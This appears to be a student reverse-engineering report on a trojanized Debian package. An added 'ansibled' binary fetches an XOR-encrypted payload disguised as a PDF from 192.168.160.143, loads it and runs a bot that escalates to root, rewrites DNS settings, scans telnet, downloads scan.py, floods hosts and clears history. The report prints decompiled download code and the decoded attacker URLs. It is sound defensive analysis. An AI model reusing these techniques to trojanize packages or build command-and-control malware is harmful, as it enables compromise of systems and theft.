# Project N2
# Definition
It was proposed to us to try to analyze using reverse engineering a suspicious code that was found on campus using Reverse engineering techniques that were thought trought the semester. \
We need to find a response to the following questions:\
- **Do we really have a malware?**\
- **How the malware works and why a deb is used?**\
- **Are other hosts involved?**\
- **What is the potential impact to our organization?**\

# Strategy

First of all we started with a simple search of what is a deb and what are their components. This is the relevant information that we found:
- Deb is the file format that debian uses in its destributioiins
- This archive has 3 files: debian-binary (Containing package format number), control archive (Containig package name, version, dependencies and maintainer) and data archive(Containg the installable files)

## Integrity check 
As we checked there was too many files a shell script was made (with the help of stack overflow) to check the md5 of interely folders so we can compare them witha  genuine version

## Control
Control is a file that contains the dependencies needed, seeing that the md5 didn't match the original one  we checked this file which contained two added depedencies:
- libcurl4-openssl-dev 
- curl
![S](img/image.png)

This may suggest that the malware needs to comunicate with an external server to **extravigate information** or **download extra code** from one.

## Data
The false deb has an extra lib folder that is suspicious, besides that, the usr folder has a folder where the hashes don't match with the original one.
![](img/image-1.png)
That folder has an extra file named **ansibled**


### Ansibled
#### Strings
Running the strings command can  give us some useful information, like this:

![alt text](img/image-2.png)

We can see this file is triying to connect to some socket and using the extra libraries mentioned before
####  File analysis with ghidra
This file flow is based on signal handlers and  structures. The structure "DAT_00104190" is considered as a variable and its value will determine if the code will curl or will execute the pdf, as it is in a infinite cycle of sleeps until it detects the pdf and then runs the ReadFile functions.  The first part of the code where a file ansibled.lock is deleted was the only one we could't find a reason to.
##### Encript
Is a function started at `0x001016da` that XOR's a the second argument with the third and stores the result in the first.
![alt text](img/encript.png)
#### Threads
The main function executes a thread that is always listening and waits for a connection to be made to a port a reads it and saves it on a variable.
#### Singal handler
On memory address `00101b37`is a function that will be the handler of a signal.
![Signal handler](img/SignalHandler.png)
This function points to two others
##### FUN_00101758
At `00101758` this function decodes two strings
-  From `"m6/2m%7+&\'l2&$` to `/tmp/guide.pdf`
-  From `*662xmms{plstzlstrlsvqm%7+&\'l2&$` to `http://192.168.160.143/guid?e.pdf`

Next the code 
```
  local_10 = curl_easy_init();
  if (local_10 != 0) {
    local_18 = fopen(local_a8,"wb");
    local_1c = 0x2712;
    curl_easy_setopt(local_10,0x2712,local_68);
    local_20 = 0x4e2b;
    curl_easy_setopt(local_10,0x4e2b,0);
    local_24 = 0x2711;
    curl_easy_setopt(local_10,0x2711,local_18);
    local_28 = curl_easy_perform(local_10);
    curl_easy_cleanup(local_10);
    if (local_28 != 0) {
      unlink(local_a8);
    }
    fclose(local_18);
  }
```
after serching for a bit we've found this example that very looks like the code above in "https://curl.se/libcurl/c/curl_easy_init.html"
![](img/ExampleCurl.png)
With the all evidence above we can see that this code is doing curl of a PDF file. 
We curled the pdf to see what it was and got a "500 comandos de Linux explicados".  We thought it could be a Poliglot so we checked the hash with a similar one we found online.
- Online:
![alt text](img/Hash1.png)
- What we Curled:
![alt text](img/Hash2.png)
It didn't match

- Online size:   1527251
-  We curled size:  1592968

##### FUN_00101a07 ->ReadFile
This is the second function of the handler and will help us tell what is done with the file.
##### FUN_001019b4-> File decription
Give an pointer, a size and a byte, it XOR's byte a byte the byte and the next byte in the pointer
![alt text](img/Filedecription.png)
##### FUN_00101870->RunSecretCode
This code works right after the File decription function, after the pdf get decripted this functions copies the pdf to ram with the name found on "0x64656c6269736e61". Then it loads the pdf as a library and looks for the symbol contained on "&DAT_001020d3" that is "RUN". After knowing the adress of that symbol it sends the code to run from there.
![alt text](/img/RunSecret.png)
## PDF analisys
A code to XOR all the PDF was made. The first function to execute would be the "run" one.

### Run
Run is the first function called in the PDF, it starts creating called "ansibled.lock" in /tmp, this file was eleminated in the ansibled file, leving us to belive that it is to not crash in case this malware is run several times. After that proc() function is called~

### Proc
#### Change Permissions
On the beginning of the pdf the program changes it's path to `/` and the uid and effective uid to root as seen on the following snippet of code.
```c
  chdir("/");
  setuid(0);
  seteuid(0);
```
#### initConnection
This function checks the sock state, adds one to the list of the number of servers goes to the structure CommService to get the string "192.168.160.143:12345", extracts the port from the IP and creates a socket IPV4. Using those parameters class ConnectTimeout

#### connectTimout
This functions tries to connect to the IP and port especified in a given timeframe.
It starts getting the file status flags 

#### getEndianness

This function always returns "Little".

#### getBuild

This always returns "x86_64"
#### UpdateNameSvrs
This function writes in "ect/resolve.conf" file the  line "nameserver 193.136.172.20\nnameserver 8.8.8.8\n" changin the ususal DNS server, probably making an attacker controlled machine the default DNS

#### RecvLine
(socket, buff, len)
Recebe mensagens no socket byte a byte e guarda no buffer,  retorna o tamano dos dados ou -1 se falhar.

#### Telnet Scanner

We are uncertain of what this telnet Scanner, howver we have various assumptions. The 1st is the most obvious and this is scanning for open tenet ports on the network and trying to get its credentials. The second is that it is trying to connect to a available telnet servers on the machine. The last is that it is trying to create a telnet server locally and setting it up to be able to connect later.
#### ProcessCmd
 This Functions receives as 1st parameter the length of the cmd and the second parameter is the actual cmd.
 + TELNET
	 + ON
		 This is creating a process to do a Telnet Scanner.
	 + OFF
		 Killing the Telnet Scanner
	 + LOAD
		 Loading a scanner created it gives 
+ PING
	 returns as soon as it enters the if.
+ PY
	+ INSTALL
		 This is installing a tool called python-paramiko which is a implementation of ssh2 to connect remotely to devices. It also download the file `scan.py` from ``http://192.168.160.143/scan.py`` we tried to see the contents of the file which we weren't able to.
		 ![alt text](/img/scan.png)
	+ UPDATING
		 Removes the file scan.py from the device.
	+ LOAD
		 Loads and runs the scan.py with extra parameters just like a random number.
	Important to notice that all this in the end Do``ClearHistory`` which clears all the commands done trying to hide its actions.
+ HTTP/UDP/TCP/STD
	 Send a HTTP/UDP/TCP/STD request with certain parameters which we are unable to discover without dynamic analysis.
+ KILL
	 This kills all processes created
+ UPDATE
	 Destroys Temporary files like logs and history.


##### How it works

The `proc` function initiates by gathering essential system settings before executing the malicious code, utilizing previously defined functions. It manages the execution flow by first waiting for all child processes to terminate and subsequently freeing associated memory. This memory cleanup continues until it stop receiving the 'PING' command. 
After if the next command encountered is a 'DUP' command, the program stops with `exit(0)`.

The subsequent segment of the function focuses on responding to received commands using the `processCmd` function. Before processing, the function meticulously parses the received command, eliminating unnecessary spaces, removing '\\n', and converting tokens to uppercase. These refined tokens are then organized into an array and passed to `processCmd` for further handling.
